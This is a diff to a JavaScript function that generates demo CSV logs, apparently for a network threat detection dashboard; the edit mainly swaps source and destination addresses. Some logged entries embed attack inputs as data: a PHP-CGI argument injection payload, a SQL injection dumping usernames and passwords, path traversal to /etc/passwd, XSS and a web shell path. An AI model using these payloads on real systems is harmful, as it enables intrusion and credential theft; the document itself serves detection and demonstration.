-    '"2024-01-11 02:11:47.664662" r2d2 2.200.110.232 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
+    '"2024-01-11 02:11:47.664662" r2d2 10.128.3.51 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
     '"2024-01-11 02:12:08.079722" r2d2 2.200.107.146 64889 108.162.192.63 53 UDP DNS cdnrep.reimage.com "pua (suspicious)" (static)\n' +
     '"2024-01-11 02:12:47.306159" r2d2 10.1.19.42 59306 208.68.240.103 80 TCP UA "OINC (BOINC client \\(windows_x86_64 7.16.7\\))" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 02:13:25.213399" r2d2 2.200.110.233 64546 2.200.107.168 53 UDP DNS un-blocking.info "bad wpad (suspicious)" (static)\n' +
     '"2024-01-11 02:14:59.622181" r2d2 2.200.110.232 49200 2.200.107.168 53 UDP DNS taxonprofits.com "cryptowall (malware)" (static)\n' +
     '"2024-01-11 02:15:09.366237" r2d2 2.200.110.232 65514 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 02:15:09.397061" r2d2 2.200.110.233 63308 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 02:16:25.015357" r2d2 10.2.120.16 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
+    '"2024-01-11 02:16:25.015357" r2d2 10.124.72.51 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
     '"2024-01-11 02:16:31.342399" r2d2 10.3.160.42 26027 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 02:17:14.564385" r2d2 10.3.160.42 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
+    '"2024-01-11 02:17:14.564385" r2d2 10.2.120.16 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
     '"2024-01-11 02:17:59.611250" r2d2 2.200.107.146 31248 204.16.253.53 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 02:19:01.734175" r2d2 2.200.110.233 63766 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 02:20:31.822300" r2d2 10.3.160.42 26029 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 02:22:09.579696" r2d2 2.200.110.233 64889 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 02:22:22.660483" r2d2 2.200.104.32 50006 203.0.113.12 80 TCP URL trav.example(/download?file=../../../../etc/passwd) "potential directory traversal (suspicious)" (heuristic)\n' +
-    '"2024-01-11 02:23:21.192778" r2d2 2.200.110.232 50010 198.51.100.99 80 TCP HTTP (198.51.100.99)/mirai.x86 "potential iot-malware download (suspicious)" (heuristic)\n' +
+    '"2024-01-11 02:22:22.660483" r2d2 10.128.8.51 50006 203.0.113.12 80 TCP URL trav.example(/download?file=../../../../etc/passwd) "potential directory traversal (suspicious)" (heuristic)\n' +
+    '"2024-01-11 02:23:21.192778" r2d2 10.128.3.51 50010 198.51.100.99 80 TCP HTTP (198.51.100.99)/mirai.x86 "potential iot-malware download (suspicious)" (heuristic)\n' +
     '"2024-01-11 02:25:37.295881" r2d2 2.200.110.232 64224 2.200.107.168 53 UDP DNS (2td6).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 02:29:19.892040" r2d2 125.26.202.91 58108 2.200.97.15 80 TCP HTTP "2.200.97.15(/cgi-bin/php.cgi?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%64+%63%67%69%2e%66%6f%72%63%65%5f%72%65%64%69%72%65%63%74%3d%30+%2d%64+%63%67%69%2e%72%65%64%69%72%65%63%74%5f%73%74%61%74%75%73%5f%65%6e%76%3d%30+%2d%6e \\(POST <?php%20die%28@md5%28PHP-CGI%29%29;%20?>\\))" "potential php injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 02:30:19.724492" r2d2 2.200.110.232 49415 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
@@ -277,16 +277,16 @@ function getDemoCSV() {
     '"2024-01-11 02:40:56.698769" r2d2 2.200.109.50 61202 8.8.8.8 53 UDP DNS id.remoteutilities.com "rmsrat (malware)" (static)\n' +
     '"2024-01-11 02:43:43.382606" r2d2 2.200.107.146 47601 194.62.183.53 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 02:44:59.611973" r2d2 2.200.107.146 33660 194.62.183.53 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
-    '"2024-01-11 02:45:21.309284" r2d2 10.3.160.42 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
+    '"2024-01-11 02:45:21.309284" r2d2 10.2.120.16 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
     '"2024-01-11 02:46:36.040922" r2d2 10.3.160.42 23383 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 02:47:43.395263" r2d2 2.200.110.232 65377 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 02:49:37.989997" r2d2 2.200.110.232 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 02:49:37.989997" r2d2 10.128.3.51 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 02:50:10.271435" r2d2 2.200.107.146 65398 194.62.183.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 02:51:59.609754" r2d2 2.200.107.146 34343 199.249.120.1 53 UDP DNS (www).porezna-uprava.org "balkanrat (malware)" (static)\n' +
     '"2024-01-11 02:52:36.813080" r2d2 10.3.160.42 23386 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 02:53:31.000446" r2d2 2.200.108.59 26637,26638,26642,26643,26645,26649,26650,26656,26659,26660,26661,26666,26670,32832,33206,33242,33448,33510,33688,33846,34400,34530,34616,34870,34886,35046,35122,35236,35404,35420,35434,35674,35886,36586,36860,37368,37996,38082,38592,38692,39302,41368,41425,41427,41428,41429,41430,41550,42822,44010,44492,45270,45534,45674,46086,46548,46564,46612,46630,46820,47529,47531,47874,48062,48440,48484,48836,49254,49504,49736,49750,50374,51368,51482,51644,51778,51962,52562,53052,53854,53996,54028,54402,54494,54610,55096,55246,56182,56308,57220,57646,57828,57908,58192,58284,58352,58878,59056,59210 77.53.81.105 21,6027,6076,6986,8583,8711,9287,9612,9842,9892,9941,10153,10216,11104,13544,15375,18027,18092,18412,19338,19674,20059,20104,20395,20833,21584,21974,23763,23880,24632,24971,25689,27821,27921,28819,29338,29521,29636,29645,29891,30362,31317,32515,32909,33243,34327,35486,36295,36698,37628,38849,39022,39193,41859,42896,43647,44236,46022,46559,47402,47679,48750,49558,49888,50880,54293,54688,55325,55753,55783,55972,56579,57983,58681,58979,59883,60149,62163,62240,62456,64289 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 02:53:37.609943" r2d2 2.200.110.233 63977 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.42kdb12.net "teslacrypt (malware)" (static)\n' +
-    '"2024-01-11 02:54:46.022112" r2d2 2.200.104.32 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
+    '"2024-01-11 02:54:46.022112" r2d2 10.124.72.52 34149 9.9.9.9 53 UDP DNS (pyxyhydef3eq47k4407l3qjnfhs9x11n6dj6afmr7ywg3q).n2-relay.net "potential dns tunneling (suspicious)" (heuristic)\n' +
     '"2024-01-11 02:55:32.686894" r2d2 10.3.160.42 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
     '"2024-01-11 02:55:43.388692" r2d2 2.200.110.232 65333 2.200.107.168 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 02:55:57.650437" r2d2 2.200.110.232 63513 2.200.107.168 53 UDP DNS soaring.betsystemreviews.com "ek nuclear (malicious)" (static)\n' +
@@ -294,9 +294,9 @@ function getDemoCSV() {
     '"2024-01-11 02:58:15.674152" r2d2 2.200.110.232 63565 2.200.107.169 53 UDP DNS (vio-ck-zvdnggdkkp).dynamic-m.com "dynamic domain (suspicious)" (static)\n' +
     '"2024-01-11 02:58:20.526669" r2d2 2.200.107.146 24032 194.62.183.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 02:58:21.409546" r2d2 2.200.107.146 56111 198.51.44.70 53 UDP DNS tbapi.search.ask.com "pua (suspicious)" (static)\n' +
-    '"2024-01-11 02:58:41.954101" r2d2 2001:db8:2::11 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
-    '"2024-01-11 02:59:46.058621" r2d2 2.200.110.232 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
-    '"2024-01-11 03:01:23.385815" r2d2 2.200.110.232 50012 203.0.113.17 80 TCP URL dl.example(/setup.exe) "direct .exe download (suspicious)" (heuristic)\n' +
+    '"2024-01-11 02:58:41.954101" r2d2 2001:db8:2::11 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
+    '"2024-01-11 02:59:46.058621" r2d2 10.128.3.51 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
+    '"2024-01-11 03:01:23.385815" r2d2 10.128.3.52 50012 203.0.113.17 80 TCP URL dl.example(/setup.exe) "direct .exe download (suspicious)" (heuristic)\n' +
     '"2024-01-11 03:02:37.559246" r2d2 10.3.160.42 23391 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 03:02:37.658938" r2d2 10.3.160.42 23391 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 03:02:50.753273" r2d2 10.1.19.42 59502 208.68.240.103 80 TCP UA "OINC (BOINC client \\(windows_x86_64 7.16.7\\))" "user agent (suspicious)" (heuristic)\n' +
@@ -311,12 +311,12 @@ function getDemoCSV() {
     '"2024-01-11 03:08:47.677617" r2d2 2.200.110.233 64474 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.42kdb12.net "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 03:08:48.046538" r2d2 2.200.110.233 64669 2.200.107.168 53 UDP DNS supervision.sactown.us "ek nuclear (malicious)" (static)\n' +
     '"2024-01-11 03:08:48.047923" r2d2 2.200.107.146 62554 173.201.68.21 53 UDP DNS supervision.sactown.us "ek nuclear (malicious)" (static)\n' +
-    '"2024-01-11 03:09:32.490551" r2d2 10.2.120.16 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
+    '"2024-01-11 03:09:32.490551" r2d2 10.43.192.103 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
     '"2024-01-11 03:09:59.620532" r2d2 2.200.110.232 65391 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 03:10:59.608786" r2d2 2.200.110.232 64502 2.200.107.168 53 UDP DNS (2td6).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 03:11:06.326353" r2d2 10.1.19.42 59507 208.68.240.103 80 TCP UA "OINC (BOINC client \\(windows_x86_64 7.16.7\\))" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 03:12:20.876029" r2d2 2.200.110.233 64794 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 03:12:43.950740" r2d2 10.2.120.16 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 03:12:43.950740" r2d2 10.124.72.51 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
     '"2024-01-11 03:14:40.650019" r2d2 10.3.160.42 30888 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 03:14:59.614371" r2d2 2.200.107.146 47447 194.62.182.53 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 03:15:43.393950" r2d2 2.200.110.232 64539 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
@@ -328,7 +328,7 @@ function getDemoCSV() {
     '"2024-01-11 03:20:31.077157" r2d2 2.200.107.146 20732 45.54.64.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 03:20:41.912855" r2d2 10.3.160.42 30891 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 03:21:41.136022" r2d2 2.200.110.233 65440 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 03:21:48.281331" r2d2 2.200.104.32 50013 203.0.113.18 80 TCP HTTP 203.0.113.18/adminpanel "missing host header (suspicious)" (heuristic)\n' +
+    '"2024-01-11 03:21:48.281331" r2d2 10.128.8.51 50013 203.0.113.18 80 TCP HTTP 203.0.113.18/adminpanel "missing host header (suspicious)" (heuristic)\n' +
     '"2024-01-11 03:22:51.143012" r2d2 2.200.110.233 64479 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 03:23:32.000285" r2d2 2.200.108.59 11351,11352,11355,11357,11358,11363,11365,11366,11371,11379,11382,32958,33194,33616,33744,34544,35048,35230,35254,35346,35448,35486,35986,36838,36962,37044,37448,37476,37488,38090,38488,38942,38998,39124,39434,40370,40776,40976,42071,42072,42077,42242,42324,42722,43154,43526,43982,44102,44896,44982,45374,45862,46542,47082,47840,47940,48094,48199,48202,48204,48206,49472,49526,49774,50182,50720,50728,51498,51506,51956,52702,53218,53296,53568,54954,55226,55810,55860,56286,56598,59262,59384,59454,59950,59982,60102,60152,60268,60342,60782 77.53.81.105 21,7703,8679,9213,9682,9753,10280,12832,13117,13922,14064,15022,15238,15977,16235,16575,17696,18663,21246,21690,21991,22328,25693,25725,26069,26365,26492,26807,28773,29161,29849,30519,31749,32988,33062,33770,35642,37518,38073,39260,39846,39934,40152,40275,41055,41734,41991,43201,44239,46083,47359,47579,48166,48955,49722,50028,51058,52311,52344,52906,53097,53309,55367,58030,59628,59725,60657,60770,61602,61786,62542,64556,64844 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 03:24:42.692526" r2d2 10.3.160.42 30893 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
@@ -336,19 +336,19 @@ function getDemoCSV() {
     '"2024-01-11 03:26:17.856240" r2d2 2.200.110.232 64238 2.200.107.169 53 UDP DNS iynus.net "locky (malware)" (static)\n' +
     '"2024-01-11 03:26:21.165888" r2d2 2.200.110.232 65064 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 03:26:41.887739" r2d2 10.3.160.42 30894 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 03:28:36.400226" r2d2 10.2.120.16 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
+    '"2024-01-11 03:28:36.400226" r2d2 10.124.72.51 40000 198.51.100.7 1000 UDP IP 203.0.113.9 "potential udp scanning" (heuristic)\n' +
     '"2024-01-11 03:29:02.314249" r2d2 2.200.110.232 65533 2.200.107.169 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 03:29:02.402137" r2d2 2.200.110.233 63522 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.tor2web.blutmagie.de "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 03:30:42.361321" r2d2 10.3.160.42 30896 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 03:32:48.285445" r2d2 10.2.120.16 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 03:32:48.285445" r2d2 10.124.72.51 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
     '"2024-01-11 03:33:32.000606" r2d2 2.200.108.59 11759,11760,11764,11766,11767,33394,33892,33960,34094,34912,35768,36054,36190,36494,37362,37462,37494,38048,38274,38834,39458,39476,39672,39674,39816,39856,39992,40068,41414,42307,42308,42309,42310,42311,42312,42314,42315,43168,43438,43642,43766,44590,44600,44684,46220,46442,47292,47576,48228,48432,48433,48434,48472,48628,48686,49270,49622,50908,50946,51704,52204,52292,52846,54390,55242,55466,55622,55824,56116,57598,57828,58020,59684,59738,59974,60326,60562,60648 77.53.81.105 21,8210,12135,13631,13918,14121,18561,18794,19674,21354,21468,21579,21917,23052,25891,26647,26785,26818,28178,28822,29962,30021,31220,31915,33491,33695,34855,35357,36414,36502,36800,39166,40152,40176,42334,42997,44528,44543,44956,46120,47397,48529,48547,48818,51458,52911,53455,53579,53995,54048,54817,57764,58508,59472,59772,59987,60173,60722,60833,61345,62767,62971,64496,64984 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 03:33:54.273234" r2d2 45.144.136.187 41560 2.200.110.170 80 TCP HTTP "2.200.110.170(/cgi-bin/php5?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%64+%63%67%69%2e%66%6f%72%63%65%5f%72%65%64%69%72%65%63%74%3d%30+%2d%64+%63%67%69%2e%72%65%64%69%72%65%63%74%5f%73%74%61%74%75%73%5f%65%6e%76%3d%30+%2d%6e \\(POST <?php%20die%28@md5%28PHP-CGI%29%29;%20?>\\))" "potential php injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 03:33:54.273234" "dmz probe" 45.144.136.187 41560 2.200.110.170 80 TCP HTTP "2.200.110.170(/cgi-bin/php5?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%64+%63%67%69%2e%66%6f%72%63%65%5f%72%65%64%69%72%65%63%74%3d%30+%2d%64+%63%67%69%2e%72%65%64%69%72%65%63%74%5f%73%74%61%74%75%73%5f%65%6e%76%3d%30+%2d%6e \\(POST <?php%20die%28@md5%28PHP-CGI%29%29;%20?>\\))" "potential php injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 03:37:58.339931" r2d2 2.200.110.233 63671 2.200.107.168 53 UDP DNS tredokilo745241.ru "zeus (malware)" (static)\n' +
     '"2024-01-11 03:38:43.382576" r2d2 2.200.110.232 63808 2.200.107.168 53 UDP DNS (www).porezna-uprava.org "balkanrat (malware)" (static)\n' +
-    '"2024-01-11 03:38:55.221733" r2d2 2.200.110.232 80 10.0.0.66 50052 TCP HTTP "This domain name has been seized by the FBI" "seized domain (suspicious)" (heuristic)\n' +
+    '"2024-01-11 03:38:55.221733" r2d2 10.128.3.52 80 10.0.0.66 50052 TCP HTTP "This domain name has been seized by the FBI" "seized domain (suspicious)" (heuristic)\n' +
     '"2024-01-11 03:38:59.607514" r2d2 2.200.110.232 49277 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.42kdb12.net "teslacrypt (malware)" (static)\n' +
-    '"2024-01-11 03:40:12.185309" r2d2 10.2.120.16 50013 203.0.113.18 80 TCP HTTP 203.0.113.18/adminpanel "missing host header (suspicious)" (heuristic)\n' +
+    '"2024-01-11 03:40:12.185309" r2d2 10.43.192.103 50013 203.0.113.18 80 TCP HTTP 203.0.113.18/adminpanel "missing host header (suspicious)" (heuristic)\n' +
     '"2024-01-11 03:40:43.381432" r2d2 2.200.110.232 64437 2.200.107.168 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 03:41:27.978720" r2d2 2.200.110.233 63457 2.200.107.168 53 UDP DNS iynus.net "locky (malware)" (static)\n' +
     '"2024-01-11 03:41:27.983555" r2d2 2.200.110.232 64322 2.200.107.168 53 UDP DNS soaring.betsystemreviews.com "ek nuclear (malicious)" (static)\n' +
@@ -404,7 +404,7 @@ function getDemoCSV() {
     '"2024-01-11 03:55:19.242429" r2d2 61.153.224.158 31681 2.200.101.86 80 TCP URL (2.200.101.86)/shell.php "web shells (suspicious)" (static)\n' +
     '"2024-01-11 03:55:32.493891" r2d2 2.200.107.146 51850 194.62.182.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 03:55:32.527992" r2d2 2.200.110.233 64111 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 03:57:33.494180" r2d2 2.200.110.232 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
+    '"2024-01-11 03:57:33.494180" r2d2 10.128.3.51 52000 198.51.100.7 80 TCP PATH * "potential web scanning" (heuristic)\n' +
     '"2024-01-11 03:58:47.956057" r2d2 10.3.160.42 14133 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 03:58:49.357756" r2d2 10.3.160.42 14133 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 03:58:57.902374" r2d2 2.200.110.233 64957 2.200.107.169 53 UDP DNS content-delivery.in "afrodita (malware)" (static)\n' +
@@ -426,14 +426,14 @@ function getDemoCSV() {
     '"2024-01-11 04:14:59.610939" r2d2 2.200.107.146 17791 45.54.64.53 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 04:15:15.069640" r2d2 2.200.110.232 64574 2.200.107.168 53 UDP DNS (vio-ck-zvdnggdkkp).dynamic-m.com "dynamic domain (suspicious)" (static)\n' +
     '"2024-01-11 04:16:33.072336" r2d2 2.200.110.233 64344 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 04:17:31.734769" r2d2 10.3.160.42 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
-    '"2024-01-11 04:17:55.891834" r2d2 10.2.120.16 50008 203.0.113.14 80 TCP URL xss.example(/search?q=<script>alert%281%29</script>) "potential xss injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 04:17:31.734769" r2d2 10.2.120.16 31000 9.9.9.9 53 UDP DNS (h01000).lookup.aeqx-cdn.net "potential dns exhaustion (suspicious)" (heuristic)\n' +
+    '"2024-01-11 04:17:55.891834" r2d2 10.43.192.103 50008 203.0.113.14 80 TCP URL xss.example(/search?q=<script>alert%281%29</script>) "potential xss injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 04:17:59.609529" r2d2 2.200.110.232 64405 2.200.107.169 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 04:18:51.818516" r2d2 10.3.160.42 27228 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 04:18:53.124529" r2d2 2.200.107.146 56530 204.16.253.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 04:19:42.900647" r2d2 2.200.110.233 65311 2.200.107.169 53 UDP DNS un-blocking.info "bad wpad (suspicious)" (static)\n' +
-    '"2024-01-11 04:20:36.687935" r2d2 10.3.160.42 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
-    '"2024-01-11 04:21:51.909940" r2d2 2001:db8:2::17 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 04:20:36.687935" r2d2 10.2.120.16 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 04:21:51.909940" r2d2 2001:db8:2::17 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 04:22:08.375161" r2d2 178.17.174.14 60070 2.200.109.24 80 TCP UA "FunWebProducts (Mozilla/5.0 \\(compatible; MSIE 9.0; Windows NT 6.0; WOW64; Trident/5.0; FunWebProducts; yie9\\))" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 04:23:32.000030" r2d2 2.200.108.59 13514,13515,13517,13518,13520,13522,13523,13525,13526,13533,13535,13536,13538,13541,13542,33402,34344,34512,35244,35504,35566,36042,36210,36636,37030,39706,39996,40528,40804,41230,41334,41390,42596,42796,43371,43374,43375,43376,43780,44044,44080,44450,44468,44482,44780,45100,45406,45596,48658,48802,48882,48932,49010,49138,49351,49354,49474,49480,49592,50238,51394,51452,51858,52528,52728,52764,52900,53086,54144,54204,54718,55288,55792,56140,56408,57236,58326,58586,59048,59092,59630,60024,60210,60834,60862 77.53.81.105 21,5830,6189,6558,9390,9526,10193,10790,11743,12185,13319,14611,14708,15211,18877,20707,21825,22013,23120,23374,24063,26146,27634,28984,30206,30485,31263,31959,32428,33033,33565,33976,34048,34674,37581,38478,39619,39710,40659,41016,42712,42793,43287,44269,44673,47086,48564,51886,52842,53524,53607,55991,56347,56445,56712,56999,57921,58682,59048,59448,61830,62888,63593,64484,64807,65054 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 04:23:49.694307" r2d2 10.1.19.42 59667 208.68.240.103 80 TCP UA "OINC (BOINC client \\(windows_x86_64 7.16.7\\))" "user agent (suspicious)" (heuristic)\n' +
@@ -442,12 +442,12 @@ function getDemoCSV() {
     '"2024-01-11 04:26:48.895402" r2d2 2.200.110.232 64668 2.200.107.169 53 UDP DNS tredokilo745241.ru "zeus (malware)" (static)\n' +
     '"2024-01-11 04:27:01.241915" r2d2 2.200.110.233 64779 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 04:28:52.670819" r2d2 10.3.160.42 27233 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 04:28:53.754660" r2d2 10.3.160.42 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 04:28:53.754660" r2d2 10.3.160.42 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
